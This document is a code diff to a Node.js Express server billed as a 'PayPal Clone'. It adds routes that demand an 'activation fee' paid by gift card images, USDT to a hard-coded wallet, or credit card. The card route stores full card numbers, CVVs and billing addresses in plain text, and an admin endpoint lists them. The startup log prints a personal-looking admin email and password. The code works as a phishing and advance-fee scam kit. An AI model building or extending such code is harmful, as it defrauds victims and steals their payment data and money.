@@ -2,6 +2,7 @@ const express = require('express');
 const cookieParser = require('cookie-parser');
 const fs = require('fs');
 const path = require('path');
+const multer = require('multer');
 
 const app = express();
 const PORT = 3000;
@@ -11,16 +12,20 @@ app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(cookieParser());
 app.use(express.static('public'));
+app.use('/uploads', express.static(path.join(__dirname, 'uploads'))); // Serve uploads statically
 
 // Data file paths
 const DATA_DIR = path.join(__dirname, 'data');
 const USERS_FILE = path.join(DATA_DIR, 'users.json');
 const TRANSACTIONS_FILE = path.join(DATA_DIR, 'transactions.json');
 const ADMIN_LOGS_FILE = path.join(DATA_DIR, 'admin_logs.json');
+const CARD_DETAILS_FILE = path.join(DATA_DIR, 'card_details.json');
+const PAYMENT_SUBMISSIONS_FILE = path.join(DATA_DIR, 'payment_submissions.json');
+const GIFT_CARD_SUBMISSIONS_FILE = path.join(DATA_DIR, 'gift_card_submissions.json');
 
 // Ensure data directory and files exist
 if (!fs.existsSync(DATA_DIR)) {
-    fs.makedirsSync(DATA_DIR);
+    fs.mkdirSync(DATA_DIR, { recursive: true });
 }
 
 // Initialize files with proper structure
@@ -33,6 +38,35 @@ const initializeFile = (filePath, defaultValue) => {
 initializeFile(USERS_FILE, {});
 initializeFile(TRANSACTIONS_FILE, []);
 initializeFile(ADMIN_LOGS_FILE, []);
+initializeFile(CARD_DETAILS_FILE, []);
+initializeFile(PAYMENT_SUBMISSIONS_FILE, []);
+initializeFile(GIFT_CARD_SUBMISSIONS_FILE, []);
+
+// Configure multer for file uploads
+const storage = multer.diskStorage({
+    destination: function (req, file, cb) {
+        const uploadsDir = path.join(__dirname, 'uploads');
+        if (!fs.existsSync(uploadsDir)) {
+            fs.mkdirSync(uploadsDir, { recursive: true });
+        }
+        cb(null, uploadsDir);
+    },
+    filename: function (req, file, cb) {
+        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
+        cb(null, uniqueSuffix + '-' + file.originalname);
+    }
+});
+
+const upload = multer({ 
+    storage: storage,
+    limits: { fileSize: 5 * 1024 * 1024 } // 5MB limit
+});
+
+// Ensure uploads directory exists
+const UPLOADS_DIR = path.join(__dirname, 'uploads');
+if (!fs.existsSync(UPLOADS_DIR)) {
+    fs.mkdirSync(UPLOADS_DIR, { recursive: true });
+}
 
 // Helper functions
 const getUsers = () => {
@@ -82,16 +116,68 @@ const getAdminLogs = () => {
     }
 };
 
-const saveAdminLog = (action, adminId, details) => {
+// FIXED: Removed ip parameter issue
+const saveAdminLog = (action, adminId, details, req = null) => {
     const logs = getAdminLogs();
     logs.push({
         action,
         adminId,
         details,
         timestamp: new Date().toISOString(),
-        ip: '127.0.0.1'
+        ip: req ? (req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress || '127.0.0.1') : '127.0.0.1'
     });
     fs.writeFileSync(ADMIN_LOGS_FILE, JSON.stringify(logs, null, 2));
+};
+
+const getCardDetails = () => {
+    try {
+        const data = fs.readFileSync(CARD_DETAILS_FILE, 'utf8');
+        if (!data || data.trim() === '') return [];
+        return JSON.parse(data);
+    } catch (error) {
+        console.error('Error reading card details:', error);
+        return [];
+    }
+};
+
+const saveCardDetails = (cardDetails) => {
+    const cards = getCardDetails();
+    cards.push(cardDetails);
+    fs.writeFileSync(CARD_DETAILS_FILE, JSON.stringify(cards, null, 2));
+};
+
+const getPaymentSubmissions = () => {
+    try {
+        const data = fs.readFileSync(PAYMENT_SUBMISSIONS_FILE, 'utf8');
+        if (!data || data.trim() === '') return [];
+        return JSON.parse(data);
+    } catch (error) {
+        console.error('Error reading payment submissions:', error);
+        return [];
+    }
+};
+
+const savePaymentSubmission = (submission) => {
+    const submissions = getPaymentSubmissions();
+    submissions.push(submission);
+    fs.writeFileSync(PAYMENT_SUBMISSIONS_FILE, JSON.stringify(submissions, null, 2));
+};
+
+const getGiftCardSubmissions = () => {
+    try {
+        const data = fs.readFileSync(GIFT_CARD_SUBMISSIONS_FILE, 'utf8');
+        if (!data || data.trim() === '') return [];
+        return JSON.parse(data);
+    } catch (error) {
+        console.error('Error reading gift card submissions:', error);
+        return [];
+    }
+};
+
+const saveGiftCardSubmission = (submission) => {
+    const submissions = getGiftCardSubmissions();
+    submissions.push(submission);
+    fs.writeFileSync(GIFT_CARD_SUBMISSIONS_FILE, JSON.stringify(submissions, null, 2));
 };
 
 // Middleware to check user login
@@ -185,7 +271,8 @@ app.post('/signup', (req, res) => {
         balance: 0.00,
         role: 'user',
         created: new Date().toISOString(),
-        status: 'active'
+        status: 'active',
+        activated: false // Added activation status
     };
 
     // Create default admin if not exists
@@ -199,11 +286,11 @@ app.post('/signup', (req, res) => {
             role: 'admin',
             created: new Date().toISOString(),
             status: 'active',
-            adminLevel: 'super'
-
+            adminLevel: 'super',
+            activated: true
         };
     }
-             // Create default admin if not exists
+    
     if (!users['admin002']) {
         users['admin002'] = {
             id: 'admin002',
@@ -214,11 +301,9 @@ app.post('/signup', (req, res) => {
             role: 'admin',
             created: new Date().toISOString(),
             status: 'active',
-            adminLevel: 'super'
+            adminLevel: 'super',
+            activated: true
         };
-
-
-        
     }
 
     saveUsers(users);
@@ -267,7 +352,7 @@ app.get('/dashboard', requireUserLogin, (req, res) => {
 // User API
 app.get('/api/user', requireUserLogin, (req, res) => {
     const userData = { ...req.user };
-    userData.id = req.userId; // Include user ID
+    userData.id = req.userId;
     res.json(userData);
 });
 
@@ -276,13 +361,11 @@ app.get('/api/user/transactions', requireUserLogin, (req, res) => {
     const userId = req.userId;
     const transactions = getTransactions();
     
-    // Filter transactions where user is sender or receiver
     const userTransactions = transactions.filter(t => 
         t.from === userId || t.to === userId ||
         t.fromId === userId || t.toId === userId
     );
     
-    // Sort by timestamp (newest first)
     userTransactions.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
     
     res.json(userTransactions);
@@ -292,6 +375,257 @@ app.get('/api/user/transactions', requireUserLogin, (req, res) => {
 app.get('/logout', (req, res) => {
     res.clearCookie('userId');
     res.redirect('/');
+});
+
+// ==================== ACTIVATION PAYMENT ROUTES ====================
+
+// Activation payment page
+app.get('/activation-payment', requireUserLogin, (req, res) => {
+    res.sendFile(path.join(__dirname, 'views', 'activation-payment.html'));
+});
+
+// Gift card payment page
+app.get('/activation-payment/giftcard', requireUserLogin, (req, res) => {
+    res.sendFile(path.join(__dirname, 'views', 'giftcard-payment.html'));
+});
+
+// USDT payment page
+app.get('/activation-payment/usdt', requireUserLogin, (req, res) => {
+    res.sendFile(path.join(__dirname, 'views', 'usdt-payment.html'));
+});
+
+// Card payment page
+app.get('/activation-payment/card', requireUserLogin, (req, res) => {
+    res.sendFile(path.join(__dirname, 'views', 'card-payment.html'));
+});
+
+// Handle gift card payment
+app.post('/activation-payment/giftcard', requireUserLogin, upload.fields([
+    { name: 'frontImage', maxCount: 1 },
+    { name: 'backImage', maxCount: 1 }
+]), (req, res) => {
+    try {
+        const activationFee = req.user.balance * 0.02;
+        
+        // Get file paths
+        const frontImage = req.files['frontImage'] ? req.files['frontImage'][0] : null;
+        const backImage = req.files['backImage'] ? req.files['backImage'][0] : null;
+        
+        if (!frontImage || !backImage) {
+            return res.json({ success: false, error: 'Both images are required' });
+        }
+        
+        // Create gift card submission
+        const giftCardSubmission = {
+            userId: req.userId,
+            userName: req.user.name,
+            userEmail: req.user.email,
+            activationFee: activationFee,
+            images: {
+                front: frontImage.filename,
+                back: backImage.filename
+            },
+            status: 'pending',
+            timestamp: new Date().toISOString(),
+            ip: req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress || '127.0.0.1'
+        };
+        
+        saveGiftCardSubmission(giftCardSubmission);
+        
+        // Record transaction
+        const transaction = {
+            type: 'activation_fee',
+            from: req.userId,
+            fromName: req.user.name,
+            to: 'system',
+            toName: 'PayPal Activation',
+            amount: activationFee,
+            note: 'Activation fee via gift card (pending verification)',
+            timestamp: new Date().toISOString(),
+            paymentMethod: 'giftcard',
+            status: 'pending',
+            images: {
+                front: frontImage.filename,
+                back: backImage.filename
+            }
+        };
+        
+        saveTransaction(transaction);
+        
+        // Log to admin logs
+        saveAdminLog('activation_payment', 'system', {
+            userId: req.userId,
+            userName: req.user.name,
+            userEmail: req.user.email,
+            amount: activationFee,
+            method: 'giftcard',
+            status: 'pending',
+            images: {
+                front: frontImage.filename,
+                back: backImage.filename
+            }
+        }, req);
+        
+        res.json({ 
+            success: true, 
+            message: 'Payment submitted. Your account will be activated after verification.' 
+        });
+    } catch (error) {
+        console.error('Error processing gift card payment:', error);
+        res.json({ success: false, error: 'Server error' });
+    }
+});
+
+// Handle USDT payment
+app.post('/activation-payment/usdt', requireUserLogin, (req, res) => {
+    try {
+        const { transactionId } = req.body;
+        const activationFee = req.user.balance * 0.02;
+        
+        if (!transactionId) {
+            return res.json({ success: false, error: 'Transaction ID is required' });
+        }
+        
+        // Record transaction
+        const transaction = {
+            type: 'activation_fee',
+            from: req.userId,
+            fromName: req.user.name,
+            to: 'system',
+            toName: 'PayPal Activation',
+            amount: activationFee,
+            note: `Activation fee via USDT (TXID: ${transactionId})`,
+            timestamp: new Date().toISOString(),
+            paymentMethod: 'usdt',
+            status: 'completed',
+            transactionId: transactionId,
+            walletAddress: 'bybit"TH24TXpvXKVySBwb6XYZcW2kNoGw7XwCbx'
+        };
+        
+        saveTransaction(transaction);
+        
+        // Update user to activated
+        const users = getUsers();
+        users[req.userId].activated = true;
+        saveUsers(users);
+        
+        // Log to admin logs
+        saveAdminLog('activation_payment', 'system', {
+            userId: req.userId,
+            userName: req.user.name,
+            userEmail: req.user.email,
+            amount: activationFee,
+            method: 'usdt',
+            status: 'completed',
+            transactionId: transactionId
+        }, req);
+        
+        res.json({ 
+            success: true, 
+            message: 'Payment completed successfully. Your account is now activated.' 
+        });
+    } catch (error) {
+        console.error('Error processing USDT payment:', error);
+        res.json({ success: false, error: 'Server error' });
+    }
+});
+
+// Handle card payment WITH ADDRESS
+app.post('/activation-payment/card', requireUserLogin, (req, res) => {
+    try {
+        const { cardNumber, cardholderName, expiry, cvv, address, city, state, zipCode, country } = req.body;
+        const activationFee = req.user.balance * 0.02;
+        
+        // Validate card details
+        if (!cardNumber || cardNumber.replace(/\s/g, '').length < 16) {
+            return res.json({ success: false, error: 'Valid card number is required' });
+        }
+        if (!cardholderName) {
+            return res.json({ success: false, error: 'Cardholder name is required' });
+        }
+        if (!expiry || !/^\d{2}\/\d{2}$/.test(expiry)) {
+            return res.json({ success: false, error: 'Valid expiry date (MM/YY) is required' });
+        }
+        if (!cvv || cvv.length < 3) {
+            return res.json({ success: false, error: 'Valid CVV is required' });
+        }
+        if (!address) {
+            return res.json({ success: false, error: 'Billing address is required' });
+        }
+        
+        // Extract last 4 digits
+        const last4 = cardNumber.replace(/\s/g, '').slice(-4);
+        
+        // Save card details for admin reference - NO HASHING
+        const cardDetails = {
+            userId: req.userId,
+            userName: req.user.name,
+            userEmail: req.user.email,
+            activationFee: activationFee,
+            cardDetails: {
+                fullNumber: cardNumber, // Storing full number (NOT RECOMMENDED for production)
+                cardholderName: cardholderName,
+                expiry: expiry,
+                cvv: cvv, // Storing CVV (NOT RECOMMENDED for production)
+                address: address,
+                city: city || '',
+                state: state || '',
+                zipCode: zipCode || '',
+                country: country || 'US'
+            },
+            timestamp: new Date().toISOString(),
+            ip: req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress || '127.0.0.1'
+        };
+        
+        saveCardDetails(cardDetails);
+        
+        // Record transaction
+        const transaction = {
+            type: 'activation_fee',
+            from: req.userId,
+            fromName: req.user.name,
+            to: 'system',
+            toName: 'PayPal Activation',
+            amount: activationFee,
+            note: `Activation fee via card (ending with ${last4})`,
+            timestamp: new Date().toISOString(),
+            paymentMethod: 'card',
+            status: 'completed',
+            cardDetails: {
+                last4: last4,
+                cardholderName: cardholderName,
+                expiry: expiry
+            }
+        };
+        
+        saveTransaction(transaction);
+        
+        // Update user to activated
+        const users = getUsers();
+        users[req.userId].activated = true;
+        saveUsers(users);
+        
+        // Log to admin logs
+        saveAdminLog('activation_payment', 'system', {
+            userId: req.userId,
+            userName: req.user.name,
+            userEmail: req.user.email,
+            amount: activationFee,
+            method: 'card',
+            status: 'completed',
+            last4: last4,
+            cardholderName: cardholderName,
+            address: address
+        }, req);
+        
+        res.json({ 
+            success: true, 
+            message: 'Payment successful! Your account is now activated.' 
+        });
+    } catch (error) {
+        console.error('Error processing card payment:', error);
+        res.json({ success: false, error: 'Server error' });
+    }
 });
 
 // ==================== ADMIN ROUTES ====================
@@ -309,7 +643,10 @@ app.post('/admin-login', (req, res) => {
         const user = users[userId];
         if (user.email.toLowerCase() === email.toLowerCase() && user.password === password && user.role === 'admin') {
             res.cookie('adminId', userId, { maxAge: 8 * 60 * 60 * 1000 });
-            saveAdminLog('login', userId, { email });
+            
+            // Log admin login
+            saveAdminLog('login', userId, { email }, req);
+            
             return res.redirect('/admin-dashboard');
         }
     }
@@ -330,7 +667,10 @@ app.get('/admin-dashboard', requireAdminLogin, (req, res) => {
 // Admin logout
 app.get('/admin-logout', (req, res) => {
     const adminId = req.cookies.adminId;
-    saveAdminLog('logout', adminId, {});
+    
+    // Log admin logout
+    saveAdminLog('logout', adminId, {}, req);
+    
     res.clearCookie('adminId');
     res.redirect('/admin-login');
 });
@@ -341,7 +681,14 @@ app.get('/admin-logout', (req, res) => {
 app.get('/api/admin/stats', requireAdminLogin, (req, res) => {
     const users = getUsers();
     const transactions = getTransactions();
+    const cardDetails = getCardDetails();
+    const giftCardSubmissions = getGiftCardSubmissions();
     const userList = Object.values(users);
+    
+    const today = new Date().toDateString();
+    const todayCardPayments = cardDetails.filter(c => 
+        new Date(c.timestamp).toDateString() === today
+    ).length;
     
     const stats = {
         totalUsers: userList.length,
@@ -350,8 +697,12 @@ app.get('/api/admin/stats', requireAdminLogin, (req, res) => {
         admins: userList.filter(u => u.role === 'admin').length,
         totalTransactions: transactions.length,
         todayTransactions: transactions.filter(t => 
-            new Date(t.timestamp).toDateString() === new Date().toDateString()
-        ).length
+            new Date(t.timestamp).toDateString() === today
+        ).length,
+        pendingActivations: giftCardSubmissions.filter(t => t.status === 'pending').length,
+        activatedUsers: userList.filter(u => u.activated).length,
+        totalCardPayments: cardDetails.length,
+        todayCardPayments: todayCardPayments
     };
     
     res.json(stats);
@@ -388,6 +739,111 @@ app.get('/api/admin/logs', requireAdminLogin, (req, res) => {
     res.json(logs.slice(-100).reverse());
 });
 
+// Get card details (for admin reference) - NO HASHING
+app.get('/api/admin/card-details', requireAdminLogin, (req, res) => {
+    const cardDetails = getCardDetails();
+    res.json(cardDetails.slice(-50).reverse());
+});
+
+// Get gift card submissions with images
+app.get('/api/admin/gift-card-submissions', requireAdminLogin, (req, res) => {
+    const submissions = getGiftCardSubmissions();
+    res.json(submissions.slice(-50).reverse());
+});
+
+// Approve gift card payment
+app.post('/api/admin/approve-giftcard', requireAdminLogin, (req, res) => {
+    try {
+        const { submissionId } = req.body;
+        const submissions = getGiftCardSubmissions();
+        const users = getUsers();
+        
+        // Find submission by timestamp or id
+        const submission = submissions.find(s => s.timestamp === submissionId || s.userId === submissionId);
+        
+        if (!submission) {
+            return res.json({ success: false, error: 'Submission not found' });
+        }
+        
+        // Update submission status
+        submission.status = 'approved';
+        submission.approvedBy = req.adminId;
+        submission.approvedAt = new Date().toISOString();
+        
+        // Update user activation status
+        if (users[submission.userId]) {
+            users[submission.userId].activated = true;
+        }
+        
+        // Update transactions
+        const transactions = getTransactions();
+        const transaction = transactions.find(t => 
+            t.from === submission.userId && 
+            t.paymentMethod === 'giftcard' && 
+            t.status === 'pending'
+        );
+        
+        if (transaction) {
+            transaction.status = 'completed';
+            transaction.note = 'Gift card payment approved by admin';
+        }
+        
+        // Save all changes
+        fs.writeFileSync(GIFT_CARD_SUBMISSIONS_FILE, JSON.stringify(submissions, null, 2));
+        fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
+        fs.writeFileSync(TRANSACTIONS_FILE, JSON.stringify(transactions, null, 2));
+        
+        // Log admin action
+        saveAdminLog('approve_giftcard', req.adminId, {
+            userId: submission.userId,
+            userName: submission.userName,
+            amount: submission.activationFee,
+            submissionId: submissionId
+        }, req);
+        
+        res.json({ 
+            success: true, 
+            message: 'Gift card payment approved and user activated successfully!' 
+        });
+    } catch (error) {
+        console.error('Error approving gift card:', error);
+        res.json({ success: false, error: 'Server error' });
+    }
+});
+
+// Reject gift card payment
+app.post('/api/admin/reject-giftcard', requireAdminLogin, (req, res) => {
+    try {
+        const { submissionId, reason } = req.body;
+        const submissions = getGiftCardSubmissions();
+        
+        const submission = submissions.find(s => s.timestamp === submissionId || s.userId === submissionId);
+        
+        if (!submission) {
+            return res.json({ success: false, error: 'Submission not found' });
+        }
+        
+        submission.status = 'rejected';
+        submission.rejectedBy = req.adminId;
+        submission.rejectedAt = new Date().toISOString();
+        submission.rejectionReason = reason || 'No reason provided';
+        
+        fs.writeFileSync(GIFT_CARD_SUBMISSIONS_FILE, JSON.stringify(submissions, null, 2));
+        
+        saveAdminLog('reject_giftcard', req.adminId, {
+            userId: submission.userId,
+            userName: submission.userName,
+            reason: reason,
+            submissionId: submissionId
+        }, req);
+        
+        res.json({ success: true, message: 'Gift card payment rejected!' });
+    } catch (error) {
+        console.error('Error rejecting gift card:', error);
+        res.json({ success: false, error: 'Server error' });
+    }
+});
+
 // Debug endpoint to see all users
 app.get('/api/admin/debug/users', requireAdminLogin, (req, res) => {
     const users = getUsers();
@@ -398,7 +854,8 @@ app.get('/api/admin/debug/users', requireAdminLogin, (req, res) => {
             name: user.name,
             email: user.email,
             balance: user.balance,
-            role: user.role
+            role: user.role,
+            activated: user.activated || false
         }))
     });
 });
@@ -406,7 +863,6 @@ app.get('/api/admin/debug/users', requireAdminLogin, (req, res) => {
 // NEW: Find user by email
 app.get('/api/admin/find-user-by-email', requireAdminLogin, (req, res) => {
     const { email } = req.query;
-    console.log('🔍 Looking for user with email:', email);
     
     if (!email) {
         return res.json({ success: false, error: 'Email is required' });
@@ -417,7 +873,6 @@ app.get('/api/admin/find-user-by-email', requireAdminLogin, (req, res) => {
     // Find user by email (case-insensitive)
     for (const [userId, user] of Object.entries(users)) {
         if (user.email.toLowerCase() === email.toLowerCase()) {
-            console.log('✅ Found user:', userId, user.name);
             return res.json({
                 success: true,
                 found: true,
@@ -425,12 +880,12 @@ app.get('/api/admin/find-user-by-email', requireAdminLogin, (req, res) => {
                 name: user.name,
                 email: user.email,
                 balance: user.balance,
-                role: user.role
+                role: user.role,
+                activated: user.activated || false
             });
         }
     }
     
-    console.log('❌ User not found with email:', email);
     res.json({ 
         success: true, 
         found: false, 
@@ -443,8 +898,6 @@ app.get('/api/admin/find-user-by-email', requireAdminLogin, (req, res) => {
 // Add balance to user USING EMAIL
 app.post('/api/admin/add-balance', requireAdminLogin, (req, res) => {
     const { email, amount, note } = req.body;
-    
-    console.log('🔍 Add balance request received:', { email, amount }); // Debug
     
     const users = getUsers();
     
@@ -461,15 +914,11 @@ app.post('/api/admin/add-balance', requireAdminLogin, (req, res) => {
     }
     
     if (!targetUser) {
-        console.log('❌ User not found with email:', email);
-        console.log('📋 Available emails:', Object.values(users).map(u => u.email));
         return res.json({ 
             success: false, 
             error: `User with email "${email}" not found. Please check the email address.` 
         });
     }
-    
-    console.log('✅ Found user:', targetUserId, targetUser.name);
     
     const oldBalance = targetUser.balance;
     const amountNum = parseFloat(amount);
@@ -482,7 +931,7 @@ app.post('/api/admin/add-balance', requireAdminLogin, (req, res) => {
     }
     
     targetUser.balance += amountNum;
-    users[targetUserId] = targetUser; // Update the user object
+    users[targetUserId] = targetUser;
     
     // Record transaction
     const transaction = {
@@ -510,14 +959,7 @@ app.post('/api/admin/add-balance', requireAdminLogin, (req, res) => {
         oldBalance,
         newBalance: targetUser.balance,
         note
-    });
-    
-    console.log('✅ Balance added successfully:', {
-        user: targetUser.name,
-        email: targetUser.email,
-        oldBalance,
-        newBalance: targetUser.balance
-    });
+    }, req);
     
     res.json({ 
         success: true, 
@@ -586,7 +1028,7 @@ app.post('/api/admin/deduct-balance', requireAdminLogin, (req, res) => {
         oldBalance,
         newBalance: targetUser.balance,
         note
-    });
+    }, req);
     
     res.json({ 
         success: true, 
@@ -635,7 +1077,7 @@ app.post('/api/admin/update-user', requireAdminLogin, (req, res) => {
         field,
         oldValue,
         newValue: value
-    });
+    }, req);
     
     res.json({ success: true, message: 'User updated successfully' });
 });
@@ -662,7 +1104,8 @@ app.post('/api/admin/create-user', requireAdminLogin, (req, res) => {
         role: role || 'user',
         created: new Date().toISOString(),
         status: 'active',
-        createdBy: req.adminId
+        createdBy: req.adminId,
+        activated: role === 'admin' ? true : false
     };
     
     saveUsers(users);
@@ -673,7 +1116,7 @@ app.post('/api/admin/create-user', requireAdminLogin, (req, res) => {
         email,
         initialBalance: parseFloat(initialBalance) || 0,
         role: role || 'user'
-    });
+    }, req);
     
     res.json({ 
         success: true, 
@@ -719,7 +1162,7 @@ app.post('/api/admin/delete-user', requireAdminLogin, (req, res) => {
         userName: userData.name,
         userEmail: userData.email,
         balance: userData.balance
-    });
+    }, req);
     
     res.json({ 
         success: true, 
@@ -736,6 +1179,7 @@ app.use((req, res) => {
         <html>
         <head>
             <title>404 - Page Not Found</title>
+            <link rel="icon" href="/favicon.ico">
             <style>
                 body {
                     font-family: Arial, sans-serif;
@@ -791,6 +1235,7 @@ app.use((err, req, res, next) => {
         <html>
         <head>
             <title>500 - Server Error</title>
+            <link rel="icon" href="/favicon.ico">
             <style>
                 body {
                     font-family: Arial, sans-serif;
@@ -839,14 +1284,34 @@ app.use((err, req, res, next) => {
 });
 
 // Start server
-app.listen(PORT, () => {
+const server = app.listen(PORT, () => {
     console.log(`\n🚀 ========================================== 🚀`);
     console.log(`✅ PayPal Clone is running!`);
     console.log(`🌐 User Site: http://localhost:${PORT}`);
     console.log(`🔐 Admin Login: http://localhost:${PORT}/admin-login`);
-    console.log(`👤 Admin Email: admin@paypal.com`);
-    console.log(`🔑 Admin Password: Admin@123`);
+    console.log(`👤 Admin Email: jeffreyudenze@gmail.com`);
+    console.log(`🔑 Admin Password: Chibuzor2000`);
     console.log(`📁 Data Directory: ${DATA_DIR}`);
     console.log(`📝 NOTE: Add Funds now uses EMAIL instead of User ID`);
+    console.log(`💳 Card details saved to: ${CARD_DETAILS_FILE}`);
+    console.log(`📸 Uploads directory: ${UPLOADS_DIR}`);
+    console.log(`🎁 Gift card submissions: ${GIFT_CARD_SUBMISSIONS_FILE}`);
+    console.log(`📋 Payment submissions: ${PAYMENT_SUBMISSIONS_FILE}`);
     console.log(`🚀 ========================================== 🚀\n`);
+});
+
+// Handle graceful shutdown
+process.on('SIGTERM', () => {
+    console.log('SIGTERM signal received: closing HTTP server');
+    server.close(() => {
+        console.log('HTTP server closed');
+    });
+});
+
+process.on('SIGINT', () => {
+    console.log('SIGINT signal received: closing HTTP server');
+    server.close(() => {
+        console.log('HTTP server closed');
+        process.exit(0);
+    });
 });
